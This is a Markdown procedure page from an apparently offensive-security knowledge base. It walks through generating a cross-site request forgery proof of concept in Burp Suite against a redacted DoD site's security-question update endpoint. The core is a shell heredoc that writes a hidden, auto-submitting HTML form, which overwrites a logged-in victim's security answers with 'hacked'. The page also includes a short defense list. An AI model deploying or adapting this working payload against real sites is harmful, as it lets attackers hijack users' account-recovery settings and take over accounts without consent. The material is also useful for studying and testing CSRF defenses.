---
id: p2b3c4d5-f6e7-8901-bcde-f23456789012
tags:
  - csrf
  - poc
  - javascript
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/html-csrf-poc]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:33:24.307Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Craft-CSFR-Proof-of-Concept

## Summary

This procedure generates an HTML-based CSRF proof-of-concept using intercepted request data to forge a form submission that changes security questions without user consent.

## Description

Based on the captured POST request lacking CSRF tokens, Burp Suite's CSRF PoC generator creates an auto-submitting HTML form with hidden inputs for question IDs and attacker-controlled answers (e.g., 'hacked'). This targets authenticated users tricked into loading the page, exploiting the /member/updatesecurityquestions endpoint in a DoD application.

## Requirements

1. Intercepted HTTP request from previous step
2. Burp Suite Professional for PoC generation
3. Text editor to customize the HTML if needed

## Defense

Defensive measures and detection strategies:

- Require CSRF tokens in all POST forms
- Use SameSite cookies to prevent cross-site requests
- Log and alert on security question updates from unusual referrers

## Objectives

1. Create a functional HTML exploit that auto-submits forged data
2. Ensure compatibility with victim's browser session
3. Test the PoC locally before deployment

## Instructions

### Step 1: Generate PoC in Burp Suite

**Context**: Use Burp's built-in tool to create the HTML from the intercepted request.

**Instructions**: In Burp Repeater, right-click the request and select 'Engagement tools' > 'Generate CSRF PoC'. Customize answers to 'hacked'.

> Expected output: HTML file with form and JavaScript auto-submit.

### Step 2: Customize and Save PoC

**Context**: Adjust parameters for the attack.

**Command** ([[commands/html-csrf-poc]]):
```bash
cat > csrf_poc.html << EOF
<html>
 <body>
 <form action="https://www.█████████/member/updatesecurityquestions" method="POST">
 <input type="hidden" name="security_questions1" value="1" />
 <input type="hidden" name="security_question_answer1" value="hacked" />
 <input type="hidden" name="security_questions2" value="2" />
 <input type="hidden" name="security_question_answer2" value="hacked" />
 <input type="hidden" name="security_questions3" value="3" />
 <input type="hidden" name="security_question_answer3" value="hacked" />
 <input type="hidden" name="submit" value="Save" />
 </form>
 <script>document.forms[0].submit();</script>
 </body>
</html>
EOF
```

> This creates the file; open in browser to test submission. Expected output: Form posts to target without errors.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques

- None

## Commands Used

- [[commands/html-csrf-poc]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- csrf
- poc
- javascript
